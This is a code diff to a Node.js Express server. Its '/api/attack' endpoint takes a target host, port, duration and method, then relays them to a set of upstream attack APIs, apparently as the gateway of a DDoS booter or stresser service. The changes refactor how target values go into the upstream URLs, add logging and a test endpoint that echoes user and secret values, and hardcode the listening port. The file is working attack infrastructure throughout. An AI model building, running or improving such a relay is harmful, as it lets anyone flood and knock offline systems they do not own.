@@ -3,8 +3,6 @@ const app = express();
 const fs = require('fs');
 const axios = require('axios')
 
-const config = JSON.parse(fs.readFileSync('config.json', 'utf8'));
-
 app.get('/api/attack', (req, res) => {
     const { host, port, time, method } = req.query;
   
@@ -14,47 +12,44 @@ app.get('/api/attack', (req, res) => {
     }
 
     const apis = require('./apis.json');
-  
     const links = apis[method];
     if (!links) {
       res.json({ error: true, reason: 'Invalid method' });
       return;
     }
 
-    const promises = links.map(link => axios.get(`${link}&host=${host}&port=${port}&time=${time}`));
-    Promise.all(promises)
-      .then(responses => {
-        const data = responses.map(response => response.data);
-        res.json({ error: false, reason: "attack sent successfully" })
+    const requests = links.map((link) => {
+      const apiUrl = link.replace('[host]', host).replace('[port]', port).replace('[time]', time);
+      return axios.get(apiUrl);
+    });
+    
+    Promise.all(requests)
+      .then((responses) => {
+        const data = responses.map((response) => response.data);
+        console.log(data);
+        res.json({ error: false, reason: 'Attack sent successfully.' });
       })
-      .catch(error => {
-        res.json({ error: true, reason: error });
+      .catch((error) => {
+        console.error(error);
+        res.json({ error: true, reason: `failed to connect to server, check console!` });
       });
+  
 });
 
+// Testing Command [If you want to remove it]
+app.get('/test/', (req, res) => {
+  const { user, secret, host, port, time, method } = req.query;
+  res.json({ user, secret, host, port, time, method });
+})
+
+// 404 Error
 app.use(function(req, res) {
   res.status(404).json({
       error: 'true', reason: 'currently page is not found'
   });
 });
 
-app.listen(config.applicationPort, () => {
-  console.log('The API server has been successfully runned on port: ' + config.applicationPort);
+// Running Application
+app.listen("3000", () => {
+  console.log('The API server has been successfully runned');
 });
-
-
-
-
-
-
-
-
-
-
-
-
-
-app.get('/test', (req, res) => {
-  const { username, secret, host, port, time, method } = req.query;
-  res.json({ username, secret, host, port, time, method });
-})
